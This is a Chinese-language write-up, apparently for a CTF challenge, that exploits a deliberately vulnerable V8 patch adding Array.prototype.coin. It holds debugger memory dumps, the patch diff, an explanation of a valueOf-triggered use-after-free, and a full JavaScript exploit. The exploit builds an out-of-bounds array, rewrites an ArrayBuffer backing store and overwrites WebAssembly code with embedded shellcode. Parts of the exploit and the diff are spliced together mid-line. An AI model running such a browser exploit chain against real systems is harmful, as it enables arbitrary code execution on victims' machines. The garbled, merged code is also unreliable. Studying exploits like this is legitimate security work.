    0x114d08088259 
    pwndbg> x /20wx 0x114d0808819c
    0x114d0808819c:    0x08243905    0x080426e5    0x080881b1    0x00000026
    0x114d080881ac:    0x08042219    0x08042a39    0x00000022    0x9999999a
    0x114d080881bc:    0x3ff19999    0x9999999a    0x3ff19999    0xfff7ffff
    0x114d080881cc:    0xfff7ffff    0xfff7ffff    0xfff7ffff    0x9999999a
    0x114d080881dc:    0x40019999    0xfff7ffff    0xfff7ffff    0xfff7ffff
    pwndbg> x /20wx 0x114d080881b8
    0x114d080881b8:    0x9999999a    0x3ff19999    0x9999999a    0x3ff19999
    0x114d080881c8:    0xfff7ffff    0xfff7ffff    0xfff7ffff    0xfff7ffff
    0x114d080881d8:    0x9999999a    0x40019999    0xfff7ffff    0xfff7ffff
    0x114d080881e8:    0xfff7ffff    0xfff7ffff    0x66666666    0x400a6666
    0x114d080881f8:    0xfff7ffff    0xfff7ffff    0xfff7ffff    0xfff7ffff
    pwndbg> x /20wx 0x114d08088258
    0x114d08088258:    0x08243905    0x080426e5    0x08088241    0x00000004
    0x114d08088268:    0x00000000    0x00000000    0x00000000    0x00000000
    0x114d08088278:    0x00000000    0x00000000    0x00000000    0x00000000
    0x114d08088288:    0x00000000    0x00000000    0x00000000    0x00000000
    0x114d08088298:    0x00000000    0x00000000    0x00000000    0x00000000
    pwndbg> x /20wx 0x114d08088240
    0x114d08088240:    0x08042a39    0x00000004    0x9999999a    0x3ff19999
    0x114d08088250:    0x9999999a    0x40019999    0x08243905    0x080426e5
    0x114d08088260:    0x08088241    0x00000004    0x00000000    0x00000000
    0x114d08088270:    0x00000000    0x00000000    0x00000000    0x00000000
    0x114d08088280:    0x00000000    0x00000000    0x00000000    0x00000000
计算arr可访问的范围
    0x114d080881b8+19*8 = 0x114d08088250
可以看出，这个范围已经导入arr2的elements里，由此可以知道arr可以溢出，但是还溢出不到arr2对象那里，为了能够控制arr2对象，我们将arr2改为`var
arr2 = new Array(1.1,2.2);`可以发现，通过new创建的double Array对象，其elements位于对象下方，而不是上方。
    0x0bd3080881a5 
    0x0bd308088249 
    pwndbg> x /20wx 0x0bd308088248
    0xbd308088248:    0x08243905    0x080426e5    0x08088259    0x00000004
    0xbd308088258:    0x08042a39    0x00000004    0x9999999a    0x3ff19999
    0xbd308088268:    0x9999999a    0x40019999    0x00000000    0x00000000
    0xbd308088278:    0x00000000    0x00000000    0x00000000    0x00000000
    0xbd308088288:    0x00000000    0x00000000    0x00000000    0x00000000
    pwndbg> x /20wx 0x0bd308088258
    0xbd308088258:    0x08042a39    0x00000004    0x9999999a    0x3ff19999
    0xbd308088268:    0x9999999a    0x40019999    0x00000000    0x00000000
    0xbd308088278:    0x00000000    0x00000000    0x00000000    0x00000000
    0xbd308088288:    0x00000000    0x00000000    0x00000000    0x00000000
    0xbd308088298:    0x00000000    0x00000000    0x00000000    0x00000000
这样，arr就可以溢出控制arr2对象的结构，改写arr2的length为更大，使得arr2也变为一个oob数组，然后后续利用就类似了。我们发现这个版本的v8开启了`compression
pointer`因此利用起来可能有些麻烦，于是我们直接用构造好的oob数组来改写下方的`ArrayBuffer`以及直接从下方搜索数据，不再使用`addressOf`和`fakeObject`来伪造对象。  
exp
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    //将一个32位整数打包位64位浮点数
    function p64(val) {
       dv.setUint32(0,val & 0xFFFFFFFF,true);
       dv.setUint32(0x4,val >> 32,true);
       var float_val = dv.getFloat64(0,true);
       return float_val;
    }
    //将两个32位整数打包为一个64位浮点数
    function p64(low4,high4) {
       dv.setUint32(0,low4,true);
       dv.setUint32(0x4,high4,true);
       var float_val = dv.getFloat64(0,true);
       return float_val;
    }
    //解包64位浮点数的低四字节
    function u64_l(val) {
       dv.setFloat64(0,val,true);
       return dv.getUint32(0,true);
    }
    //解包64位浮点数的高四字节
    function u64_h(val) {
       dv.setFloat64(0,val,true);
       return dv.getUint32(0x4,true);
    }
    var obj = {};
    var arr = [];
    arr[0] = 1.1;
    arr.push(1.1,2.2,3.3,4.4,5.5,6.6);
    var oob_arr = new Array(1.1,2.2);
    var obj_arr = [obj,obj];
    var arb_buf = new ArrayBuffer(0x10);
    var d = arr[17];
    var double_element_map = u64_l(d);
    var tmp0 = u64_h(d);
    d = arr[18];
    var tmp1 = u64_l(d);
    print("double_element_map="+double_element_map.toString(16));
    arr[18] = p64(tmp1,0x100000); //修改oob_arr的length
    d = oob_arr[4];
    var obj_element_map = u64_l(d);
    print("obj_element_map=" + obj_element_map.toString(16));
    /*function addressOf(m_obj) {
       obj_arr[0] = m_obj;
       oob_arr[0x4] = p64(double_element_map,tmp0);
       var a = u64_l(obj_arr[0]) - 0x1;
       oob_arr[0x4] = p64(obj_element_map,tmp0);
       return a;
    }
    function fakeObject(addr) {
       oob_arr[0] = p64(addr + 0x1);
       arr[17] = p64(obj_element_map,tmp0);
       var a = oob_arr[0];
       arr[17] = p64(double_element_map,tmp0);
       return a;
    }*/
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    var wasm_shellcode_addr_l;
    var wasm_shellcode_addr_h;
    //搜索wasm_shellcode_addr
    for (var i=0xfe;i>=1;i-=1) {
       d = oob_arr[0x31200+i];
       wasm_shellcode_addr_l = u64_h(d);
       d = oob_arr[0x31200+i+1];
       wasm_shellcode_addr_h = u64_l(d);
       if (parseInt(wasm_shellcode_addr_h) != 0 && parseInt(wasm_shellcode_addr_l) != 0 && parseInt(wasm_shellcode_addr_l & 0xFFF) == 0) {
          print("wasm_shellcode_addr=" + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));
          break;
       }
    }
    oob_arr[0x7] = p64(tmp0,0x1000); //修改ArrayBuffer的length
    oob_arr[0x8] = p64(0,wasm_shellcode_addr_l); //backing_stroe
    oob_arr[0x9] = p64(wasm_shellcode_addr_h,0);
    oob_arr[0xa] = p64(0x2,0);
    var adv = new DataView(arb_buf);
    //替换wasm的shellcode
    for (var i=0;i receiver;
    +  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +         isolate, receiver, Object::ToObject(isolate, args.receiver()));
    +  Handle array = Handle::cast(receiver);
    +  FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    +
    +  Handle value;
    +  Handle length;
    +  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +             isolate, length, Object::ToNumber(isolate, args.at(1)));
    +  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +             isolate, value, Object::ToNumber(isolate, args.at(2)));
    +
    +  uint32_t array_length = static_cast(array->length().Number());
    +  if(37 Number());
    +    return ReadOnlyRoots(isolate).undefined_value();  
    +  }
    +  else{
    +    return ReadOnlyRoots(isolate).undefined_value();
    +  }
    +}
    +
     BUILTIN(ArrayPush) {
       HandleScope scope(isolate);
       Handle receiver = args.receiver();
    diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
    index 3412edb89d..1837771098 100644
    --- a/src/builtins/builtins-definitions.h
    +++ b/src/builtins/builtins-definitions.h
    @@ -367,6 +367,7 @@ namespace internal {
       TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
       /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
       TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
    +  CPP(ArrayCoin)                                   \
                                                                                    \
       /* ArrayBuffer */                                                            \
       /* ES #sec-arraybuffer-constructor */                                        \
    diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
    index f5fa8f19fe..03a7b601aa 100644
    --- a/src/compiler/typer.cc
    +++ b/src/compiler/typer.cc
    @@ -1701,6 +1701,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
           return Type::Receiver();
         case Builtins::kArrayUnshift:
           return t->cache_->kPositiveSafeInteger;
    +    case Builtins::kArrayCoin:
    +      return Type::Receiver();
         // ArrayBuffer functions.
         case Builtins::kArrayBufferIsView:
    diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
    index e7542dcd6b..059b54731b 100644
    --- a/src/init/bootstrapper.cc
    +++ b/src/init/bootstrapper.cc
    @@ -1663,6 +1663,8 @@ void Genesis::InitializeGlobal(Handle global_object,
                               false);
         SimpleInstallFunction(isolate_, proto, "copyWithin",
                               Builtins::kArrayPrototypeCopyWithin, 2, false);
    +    SimpleInstallFunction(isolate_, proto, "coin",
    +                Builtins::kArrayCoin, 2, false);
         SimpleInstallFunction(isolate_, proto, "fill",
                               Builtins::kArrayPrototypeFill, 1, false);
         SimpleInstallFunction(isolate_, proto, "find",
可以看到，patch为Array类型增加了一个`coin`函数，该函数功能就是如果`37 elements());
    +
    +  Handle value;
    +  Handle length;
    +  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +             isolate, length, Object::ToNumber(isolate, args.at(1)));
    +  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +             isolate, value, Object::ToNumber(isolate, args.at(2)));
先是取了elements，然后再去js层回调valueOf函数。假如我们在js层里的valueOf函数里趁机把arr的length扩大，那么Array会申请新的elements，原来那个elements被释放了，然而会到native层时，elements仍然指向的是之前那个elements位置，这就造成了UAF，而`uint32_t
array_length =
static_cast(array->length().Number());`是在之后执行，因此，我们一开始构造一个很小的arr，然后在valueOf里将arr扩大，那么即能绕过`if(37
< array_length){`的判断，从原来的elements处溢出。
####  漏洞利用
我们可以利用溢出，修改后方的array对象的length，从而构造一个可以自由oob的数组。  
POC
    var val = {
       valueOf:function() {
          a.length = 0x100;
          return 0xffffffff;
       }
    };
    var a = new Array(30);
    var arb_double_arr = [1.1,2.2];